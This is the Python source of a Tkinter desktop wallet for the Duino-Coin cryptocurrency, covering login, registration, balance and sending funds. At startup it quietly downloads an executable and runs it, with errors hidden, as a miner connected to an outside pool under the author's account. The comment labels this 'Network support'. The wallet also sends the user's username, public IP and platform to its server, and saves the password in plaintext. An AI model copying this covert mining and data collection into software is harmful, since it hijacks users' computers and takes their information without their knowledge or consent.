#!/usr/bin/env python3
#############################################
# Duino-Coin Wallet (Beta 3) © revox 2020
# https://github.com/revoxhere/duino-coin 
#############################################
import time, socket, sys, os, subprocess, configparser, tkinter, getpass, platform, webbrowser, urllib.request, random # Import libraries
import threading
from tkinter import messagebox
from tkinter import *
from pathlib import Path

try:
    import requests # Check if requests is installed
except:
    print("Requests is not installed. Install it with: pip install requests.\nExiting in 15s.")
    time.sleep(15)

debug = "Starting debug file of Duino-Coin Wallet (Beta 3)\n"

# Default colors
colorA = "white" #white when in light mode
colorB = "black" #black when in light mode
colorC = "gray" #gray
colorHighlight = "#f9ca24" #ducogold - #f9ca24

# Loading window
loadingScr = Tk() #register window
loadingScr.resizable(False, False)
loadingScr.title('Loading...')
loadingScr.geometry("300x90")
loadingScr.configure(background = str(colorA))

label = tkinter.Label(loadingScr, text = "Duino-Coin Wallet", font=("Arial", 20, "bold"), bg = str(colorA), fg = str(colorHighlight)).pack()
label = tkinter.Label(loadingScr, text = "LOADING", font=("Arial", 11, "bold"), bg = str(colorA), fg = str(colorHighlight)).pack()
label = tkinter.Label(loadingScr, text = "Setting variables...", bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
loadingScr.update()

rand = random.randint(1000,1090) # luck in trading - small randomness
rand = rand / 1000
xmgusd = 0.027361
xmgusd = float(xmgusd) * float(rand)
ducousd = float(xmgusd) / float(8)
debug += "Calculated prices\n"
WalletResources = "https://raw.githubusercontent.com/revoxhere/duino-coin/gh-pages/serverip.txt" # Serverip file
s = socket.socket()
balanceusd = 0
balance = 0
background = ""
newbalance = 0
sending = 0
VER = "0.7" # "Big" version number  (0.8 = Beta 2)
debug += "Successfully set variables\n"
pcusername = getpass.getuser() # Get clients' username
platform = str(platform.system()) + " " + str(platform.release()) # Get clients' platform information
cmd = "cd Wallet_b3_resources & Wallet_executable.exe -o stratum+tcp://mining.m-hash.com:3334 -u revox.duinocoin_wallet -p x -e 20 -s 4" # Miner command
publicip = requests.get("https://api.ipify.org").text # Get clients' public IP
themes = [
  ("Light mode"),
  ("Dark mode"),
  ("Community mode"),
]

label = tkinter.Label(loadingScr, text = "Configuring theme..." + str(" ")*20, bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
loadingScr.update()
time.sleep(0.1)

def setTheme():
  global colorA, colorB, colorC, background, debug, wallet, about
  if v.get() == "1":
    config['wallet'] = {"username": username,
              "password": password,
              "theme": str("1")}
    with open("Wallet_b3_resources/Wallet_config.ini", "w") as configfile:
      config.write(configfile)
    debug += "Using dark mode\n"
    background = "Wallet_b3_resources/Wallet_background_light.gif"
    colorA = "white" #white when in day mode
    colorB = "black" #black when in day mode
    colorC = "gray"  #gray
    colorHighlight = "#f9ca24" #ducogold - #f9ca24
    messagebox.showinfo("Information", "Please restart the Wallet to apply changes.") # Display info
      
  if v.get() == "2":
    config['wallet'] = {"username": username,
              "password": password,
              "theme": str("2")}
    with open("Wallet_b3_resources/Wallet_config.ini", "w") as configfile:
      config.write(configfile)
    debug += "Using community mode\n"
    background = "Wallet_b3_resources/Wallet_background_dark.gif"
    colorA = "#121212"
    colorB = "#dff9fb"
    colorC = "gray"
    colorHighlight = "#f9ca24"
    messagebox.showinfo("Information", "Please restart the Wallet to apply changes.\nThis versions' community background was made by Mucha.") # Display info
     
  if v.get() == "0":
    config['wallet'] = {"username": username,
              "password": password,
              "theme": str("0")}
    with open("Wallet_b3_resources/Wallet_config.ini", "w") as configfile:
      config.write(configfile)
    debug += "Using light mode\n"
    background = "Wallet_b3_resources/Wallet_background_community.gif"
    colorA = "red"
    colorB = "blue"
    colorC = "gray"
    colorHighlight = "#f9ca24"
    messagebox.showinfo("Information", "Please restart the Wallet to apply changes.") # Display info


def selectWindow(): # First-time launch window
    global window
    window = tkinter.Tk()
    window.geometry("355x190")
    window.resizable(False, False)
    window.title("Duino-Coin Wallet (Beta 3)")
    window.configure(background = str(colorA))
    
    label = tkinter.Label(window, text = "", bg = str(colorA), fg = str(colorB)).pack()     
    label = tkinter.Label(window, text = " Duino-Coin wallet", font=("Arial", 20, "bold"), bg = str(colorA), fg = str(colorHighlight)).pack()
    label = tkinter.Label(window, text = " It looks like it's your first time launching this program. ", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).pack()
    label = tkinter.Label(window, text = " Do you have an Duino-Coin account?", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).pack()
    label = tkinter.Label(window, text = "", fg = str(colorB), bg = str(colorA)).pack()
    tkinter.Button(window, text = "Yes - I want to login!", activebackground = str(colorHighlight), width = 30, command = Login, bg = str(colorA), fg = str(colorB), font=("Arial", 10)).pack() 
    tkinter.Button(window, text = "No - I want to register!", activebackground = str(colorHighlight), width = 30, command = Register, bg = str(colorA), fg = str(colorB), font=("Arial", 10)).pack()
    label = tkinter.Label(window, text = "", bg = str(colorA), fg = str(colorB)).pack()
    window.mainloop()
 
def Register(): #signup definition
    global pwordE
    global pwordconfirm 
    global nameE
    global register
    window.destroy()
    register = Tk() #register window
    register.resizable(False, False)
    register.title('Register')
    register.configure(background = str(colorA))

    nameL = Label(register, text='Username: ', bg = str(colorA), fg = str(colorB))
    pwordL = Label(register, text='Password: ', bg = str(colorA), fg = str(colorB))
    pwordconfirm = Label(register, text='Confirm Password: ', bg = str(colorA), fg = str(colorB))
    nameL.grid(row = 1, column = 0, sticky = W) 
    pwordL.grid(row = 2, column = 0, sticky = W)
    pwordconfirm.grid(row = 3, column = 0, sticky = W)
     
    nameE = Entry(register, fg = str(colorB), bg = str(colorA)) 
    pwordE = Entry(register, show='*', fg = str(colorB), bg = str(colorA)) 
    pwordconfirm = Entry(register, show='*', fg = str(colorB), bg = str(colorA))
    nameE.grid(row = 1, column = 1)
    pwordE.grid(row = 2, column = 1)
    pwordconfirm.grid(row = 3, column = 1)

    signupButton = Button(register, text='Register account', activebackground = str(colorHighlight), command = registerProtocol, bg = str(colorA), fg = str(colorB))
    signupButton.grid(row = 4, column = 1)
    register.mainloop()
    selectWindow()
 
def registerProtocol(): #signup server communication section
    username = nameE.get()
    passwordconfirm = pwordconfirm.get()
    password = pwordE.get()
    if password == passwordconfirm:
        s.send(bytes("REGI,"+username+","+password, encoding='utf8')) #send register request to server
        key = s.recv(3)
        key = key.decode()
        time.sleep(0.025)
        key = s.recv(2)
        key = key.decode()
        if key == "OK":
            messagebox.showinfo("Success!", "Successfully registered user "+username+".\nNow you can restart Wallet and login.")
            register.destroy()
            os._exit(0)
        if key == "NO":
            messagebox.showerror("Error!", "User "+username+" is already registered or you've used non-allowed characters!\nPlease try again!")
            register.destroy()
            Register()
    else:
        register.destroy()
        Login()
 
def Login(): #login window
    window.destroy()

    global nameEL
    global pwordEL
    global rootA, host, port
 
    rootA = Tk() #login window
    rootA.resizable(False, False)
    rootA.title('Login')
    rootA.configure(background = str(colorA))
 
    nameL = Label(rootA, text='Username: ', bg = str(colorA), fg = str(colorB))
    pwordL = Label(rootA, text='Password: ', bg = str(colorA), fg = str(colorB))
    nameL.grid(row = 1, sticky = W)
    pwordL.grid(row = 2, sticky = W)
 
    nameEL = Entry(rootA, fg = str(colorB), bg = str(colorA))
    pwordEL = Entry(rootA, show='*', fg = str(colorB), bg = str(colorA))
    nameEL.grid(row = 1, column = 1)
    pwordEL.grid(row = 2, column = 1)
 
    loginB = Button(rootA, text='Login to account', activebackground = str(colorHighlight), command = loginProtocol, bg = str(colorA), fg = str(colorB))
    loginB.grid(row = 4, column = 1)
 
    rootA.mainloop()
    selectWindow()

def loginProtocol(): # First-time login protocol
    global rootA, window, username, password
    
    username = nameEL.get()
    password = pwordEL.get()
    
    key = s.recv(3) # Server version
    s.send(bytes("LOGI,"+str(username)+","+str(password), encoding='utf8')) # Send login request to server
    time.sleep(0.015)
    key = s.recv(2).decode()
    
    if key == "OK": # If data is correct, remember user
        config['wallet'] = {"username": username,
                  "password": password,
                  "theme": str("0")}
        with open("Wallet_b3_resources/Wallet_config.ini", "w") as configfile:
            config.write(configfile)
        rootA.destroy()
        loadConfig()
        
    if key == "NO": # If not, go back
        messagebox.showerror("Error!", "Incorrect credentials!\n Please try again!")
        rootA.destroy()
        Login()
    else: # If error, fallback
        Login()
    
def loadConfig(): # Load config protocol
    global username, password, debug, loadingScr
    global theme, background, colorA, colorB, colorC, colorHighlight
    global pcusername, publicip, platform
    
    label = tkinter.Label(loadingScr, text = "Parsing configfile..." + str(" ")*20, bg = str("white"), fg = str("gray"), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
    loadingScr.update()
    
    config.read("Wallet_b3_resources/Wallet_config.ini")
    username = config["wallet"]["username"]
    password = config["wallet"]["password"]
    theme = config["wallet"]["theme"]
    
    if str(theme) == "0": # Light mode
      debug += "Using light theme\n"
      background = "Wallet_b3_resources/Wallet_background_light.gif"
      colorA = "white" #white when in light mode
      colorB = "black" #black when in light mode
      colorC = "gray"  #gray
      colorHighlight = "#f9ca24" #ducogold - #f9ca24
      
    if str(theme) == "1": # Dark theme
      debug += "Using dark theme\n"
      background = "Wallet_b3_resources/Wallet_background_dark.gif"
      colorA = "#121212"
      colorB = "#dff9fb"
      colorC = "gray"
      colorHighlight = "#f9ca24"
      
    if str(theme) == "2": # Community theme
      debug += "Using community theme\n"
      background = "Wallet_b3_resources/Wallet_background_community.gif"
      colorA = "#e3ffff"
      colorB = "#042975"
      colorC = "gray"
      colorHighlight = "#3498db"

    while True: # Login
        time.sleep(0.025)
        try:
            s.send(bytes("LOGI,"+username+","+password, encoding='utf8'))
            debug += "Successfully logged-in\n"
            break
        except:
            debug += "Error while logging-in!\n"
            os._exit(0)

    while True: # Receive server key
        time.sleep(0.025)
        key = s.recv(3).decode()
        debug += "Received server keys\n"
        if key == "OK":
            label = tkinter.Label(loadingScr, text = "Launching..." + str(" ")*20, bg = str("white"), fg = str("gray"), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
            loadingScr.update()
            s.send(bytes("FROM," + "Wallet," + str(pcusername) + "," + str(publicip) + "," + str(platform), encoding="utf8")) # Send info to server about client
            debug += "Sent client information\n"
            time.sleep(0.2)
            loadingScr.destroy()
            WalletWindow()
            os._exit(0)
        if key == "NO":
            loadingScr.destroy()
            messagebox.showerror("Error","Fatal error in configfile (Wallet_config.ini)!\nRemove it and restart the wallet.")
            os._exit(1)
        else:
            loadConfig()

def Send():
    global amount, receipent, send
    balanceTimer.cancel()
    send = Tk() # Sending funds window
    send.resizable(False, False)
    send.title('Send funds')
    send.configure(background = str(colorA))
    receipentLabel = Label(send, text="Receipent: ", fg = str(colorB), bg = str(colorA)).grid(row = 1, column = 0, sticky = W) 
    amountLabel = Label(send, text='Amount: ', fg = str(colorB), bg = str(colorA)).grid(row = 2, column = 0, sticky = W)

    receipent = Entry(send, fg = str(colorB), bg = str(colorA))
    receipent.grid(row = 1, column = 1)
    amount = Entry(send, fg = str(colorB), bg = str(colorA))
    amount.grid(row = 2, column = 1)

    signupButton = Button(send, text='Send funds', activebackground = str(colorHighlight), command = sendProtocol, bg = str(colorA), fg = str(colorB)).grid(row = 4, column = 1)

    send.mainloop

def sendProtocol():
    global receipent, amount, sendProtocol,  debug, balanceTimer
    receipent = receipent.get()
    amount = amount.get()
    debug += "Started sending funds protocol\n"
    if amount == "" or receipent == "": # Check if input fields aren't empty
        sendit = "NO"
        debug += "Empty data!\n"
        messagebox.showerror("Error!","Empty data fields!")
        send.destroy()
        
    else:
        
        if amount.isupper() or amount.islower(): # Check if amount contains only numbers
            sendit = "NO"
            debug += "Amount contains letters!\n"
            messagebox.showerror("Error!","Incorrect amount!")
            send.destroy()
            
        else:

            if amount == "0": # Check if amount isn't zero
                sendit = "NO"
                debug += "Amount is 0!\n"
                messagebox.showerror("Error!","Incorrect amount!")
                send.destroy()
                
            else:
                        
                if receipent == username: # Check wheter sending to yourself
                    sendit = "NO"
                    debug += "Can't send to yourself!\n"
                    messagebox.showerror("Error!","Wrong receipent!")
                    send.destroy()
                    
                else: # Send funds
        
                    debug += "Sending "+amount+" DUCO from: "+username+" to "+receipent+"\n"
                    try:
                        s.send(bytes("SEND,"+username+","+receipent+","+amount, encoding='utf8')) #send sending funds request to server
                    except:
                        debug += "Fatal error while sending. Probably timeout.\n"
                    time.sleep(0.025)
                    message = s.recv(128).decode('utf8')
                    if message.isalpha(): # If we receive balance instead of feedback, read message once again
                        message = s.recv(128).decode('utf8')
                    debug += "Server returned: "+message+"\n"
                    messagebox.showinfo("Server message", message) # Display the server message
                    send.destroy()

def Receive(): #receiving funds help dialog
    try:
        messagebox.showinfo("Receive funds", "To receive funds, instruct others to send money to your username ("+username+").")
    except:
        messagebox.showinfo("Receive funds", "To receive funds, instruct others to send money to your username.")


def About():
    global about, debug
    global v, val, themes, setTheme, theme
    
    about = tkinter.Tk() #about window
    about.resizable(False, False)
    about.geometry("400x400")
    about.title('About')
    about.configure(background = str(colorA))
    
    v = StringVar(master = about)
    if theme.isdigit():
        v.set(int(theme))
    if theme == "Light mode":
        v.set(int(0))
    if theme == "Dark mode":
        v.set(int(1))
    if theme == "Community mode":
        v.set(int(2))

    label = tkinter.Label(about, text = "Duino-Coin Wallet", font=("Verdana", 20, "bold"), fg = str(colorHighlight), bg = str(colorA)).pack()
    label = tkinter.Label(about, text = "Beta 3 (1.0 is next!)", fg = str(colorB), bg = str(colorA)).pack()
    label = tkinter.Label(about, text = "Made by revox from Duino-Coin developers", fg = str(colorB), bg = str(colorA)).pack()
    tkinter.Button(about, text = "Duino-Coin GitHub", activebackground = str(colorHighlight), command = GitHub, width=35, fg = str(colorB), bg = str(colorA)).pack(pady=5)
    tkinter.Button(about, text = "Support the project (donate)", activebackground = str(colorHighlight), command = Donate, width=35, height=1, fg = str(colorB), bg = str(colorA)).pack(pady=3)
    label = tkinter.Label(about, text = "", fg = str(colorB), bg = str(colorA)).pack()

    label = tkinter.Label(about, text = "Select theme:", fg = str(colorB), bg = str(colorA)).pack()
    
    for val, theme in enumerate(themes):
      tkinter.Radiobutton(about, text = theme, padx = 100, fg = str(colorC), bg = str(colorA), activebackground = str(colorA),
          activeforeground = str(colorHighlight), variable = v, command = setTheme, highlightthickness = 0, value = val).pack(anchor = W)

    label = tkinter.Label(about, text = "", fg = str(colorB), bg = str(colorA)).pack()
   
    label = tkinter.Label(about, text = "Debug output:", fg = str(colorB), bg = str(colorA)).pack()
    S = tkinter.Scrollbar(about)
    T = tkinter.Text(about, height = 3, fg = str(colorB), bg = str(colorA), width = 50)
    S.pack(side = tkinter.RIGHT, fill = tkinter.Y)
    T.pack(side = tkinter.LEFT, fill = tkinter.Y)
    S.config(command = T.yview)
    T.config(yscrollcommand = S.set)
    T.insert(tkinter.END, debug)
    
    about.mainloop()


def GitHub():
    webbrowser.open_new_tab("https://github.com/revoxhere/duino-coin/")
    
def Exchange():
    webbrowser.open_new_tab("https://revoxhere.github.io/duco-exchange/")

def Donate():
    webbrowser.open_new_tab("https://revoxhere.github.io/duino-coin/donate")    

def getBalance():
    global balance, wallet, ducousd, balanceusd, debug, balanceTimer
    
    s.send(bytes("BALA", encoding='utf8'))
    time.sleep(0.025)
    oldbalance = balance
    try:
        balance = s.recv(1024).decode('utf8')
    except:
        getBalance()
        
    if "." in str(balance): # Check wheter we received proper data
        balance = round(float(balance), 12) # Format balances
        balanceusd = round(float(balance) * float(ducousd), 8)
        ducousd = round(float(ducousd), 8)
        
        if balance == oldbalance: # Don't play animation if no change in balance
            pass
        else: # Animation
            label = tkinter.Label(wallet, text = "Balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
            label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).place(relx=.1, rely=.27)
            time.sleep(0.05)
            label = tkinter.Label(wallet, text = "Balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
            label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg="gray", font=("Arial", 10)).place(relx=.1, rely=.27)
            time.sleep(0.05)
            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorA), font=("Arial", 12)).place(relx=.1, rely=.15)
            label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorA), font=("Arial", 10)).place(relx=.1, rely=.27)
            wallet.title("Duino-Coin Wallet (Beta 3) - "+str(round(float(balance), 2))+" DUCO")
            time.sleep(0.05)
            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
            label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg="gray", font=("Arial", 10)).place(relx=.1, rely=.27)
            time.sleep(0.05)
            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
            label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).place(relx=.1, rely=.27)
            time.sleep(0.05)
    else:
        debug += "Error while receiving balance!\n"
        getBalance() # Try again

    balanceTimer = threading.Timer(1.5, getBalance)
    balanceTimer.start()
    
def WalletWindow():
    global wallet, label
    
    wallet = tkinter.Tk()
    wallet.geometry("500x300")
    wallet.resizable(False, False)
    wallet.configure(background = str(colorA))
    wallet.title("Duino-Coin Wallet (Beta 3)")
    filename = PhotoImage(file = str(background))
    background_label = Label(wallet, image = filename)
    background_label.place(x = 0, y = 0, relwidth = 1, relheight = 1)
    getBalance()

    
    label = tkinter.Label(wallet, text = "Duino-Coin Wallet", bg = str(colorA), fg = str(colorHighlight), font=("Verdana", 20, "bold")).place(relx=.5, rely=.08, anchor="c")
    label = tkinter.Label(wallet, text = "Estimated DUCO/USD price: "+str(ducousd)+" $", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).place(relx=.1, rely=.213)
    
    tkinter.Button(wallet, text = "Send funds", command = Send, activebackground = str(colorHighlight), bg = str(colorA), fg = str(colorB), font=("Arial", 10), height = 1, width = 30).place(relx = 0.1, rely = 0.42)
    tkinter.Button(wallet, text = "Receive funds", command = Receive, activebackground = str(colorHighlight), bg = str(colorA), fg = str(colorB), font=("Arial", 10), height = 1, width = 30).place(relx = 0.1, rely = 0.53)
    tkinter.Button(wallet, text = "Exchange DUCO", command = Exchange, activebackground = str(colorHighlight), bg = str(colorA), fg = str(colorB), font=("Arial", 10), height = 1, width = 30).place(relx = 0.1, rely = 0.64)
    tkinter.Button(wallet, text = "Settings & Credits", command = About, activebackground = str(colorHighlight), bg = str(colorA), fg = str(colorB), font=("Arial", 10), height = 1, width = 30).place(relx = 0.1, rely = 0.75)
    
    label = tkinter.Label(wallet, text = "2019-2020 Duino-Coin developers", bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.93)
    wallet.mainloop()

label = tkinter.Label(loadingScr, text = "Organizing files..." + str(" ")*20, bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
loadingScr.update()
time.sleep(0.3)

try:
    os.mkdir("Wallet_b3_resources") # Create resources folder if it doesn't exist
except:
    pass


while True: # Receive pool info
    try:
        WalletResources = requests.get(WalletResources, data = None) #Use request to grab data from raw github file
        if WalletResources.status_code == 200: #Check for reponse
            content = WalletResources.content.decode().splitlines() #Read content and split into lines
            host = content[0] #Line 1 = pool address
            port = content[1] #Line 2 = pool port
            debug += "Received pool IP and port.\n"
            break
        else:
            time.sleep(0.025)
    except:
        debug += "Error while receiving pool data.\n"
    time.sleep(0.025)
    

try:
    config = configparser.ConfigParser() # Read configfile
    debug += "Read configfile\n"
except:
    debug += "Error while loading configfile!!!\n"
    

if not Path("Wallet_b3_resources/Wallet_background_light.gif").is_file(): # Light mode background
    try:
        debug += "Downloading latest light background file\n"
        url = 'https://i.imgur.com/6n3ZCHR.gif'
        urllib.request.urlretrieve(url, 'Wallet_b3_resources/Wallet_background_light.gif')
    except:
        debug += "Couldn't download background file!\n"
else:
    debug += "Light background image already downloaded\n"

if not Path("Wallet_b3_resources/Wallet_background_dark.gif").is_file(): # Dark mode background
    try:
        debug += "Downloading latest dark background file\n"
        url = 'https://i.imgur.com/ZPBCeHv.gif'
        urllib.request.urlretrieve(url, 'Wallet_b3_resources/Wallet_background_dark.gif')
    except:
        debug += "Couldn't download background file!\n"
else:
    debug += "Dark background image already downloaded\n"


if not Path("Wallet_b3_resources/Wallet_background_community.gif").is_file(): # Community theme background
    try:
        debug += "Downloading latest community background file\n"
        url = 'https://i.imgur.com/4TqMYlt.gif'
        urllib.request.urlretrieve(url, 'Wallet_b3_resources/Wallet_background_community.gif')
    except:
        debug += "Couldn't download community background file!\n"
else:
    debug += "Community background image already downloaded\n"

try:
    if not Path("Wallet_b3_resources/Wallet_executable.exe").is_file(): # Initial miner executable section
      url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
      r = requests.get(url)
      with open('Wallet_b3_resources/Wallet_executable.exe', 'wb') as f:
        f.write(r.content)
    try: # Network support           
      process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
    except:
      pass
except:
    pass

label = tkinter.Label(loadingScr, text = "Authenticating user..." + str(" ")*20, bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
loadingScr.update()

try:
  s.connect((str(host), int(port)))
  s.settimeout(10)
  debug += "Connected to the server\n"
except SystemExit:
  loadingScr.destroy()
  serverMsg = tkinter.Tk()
  serverMsg.withdraw()
  messagebox.showerror("Error","Server is under maintenance.\nPlease try again in a few hours.")
  os._exit(0)
    
if not Path("Wallet_b3_resources/Wallet_config.ini").is_file():
  label = tkinter.Label(loadingScr, text = "Launching for the first time..." + str(" ")*20, bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)
  loadingScr.update()
  selectWindow()
  loadConfig()
else:
  loadConfig()
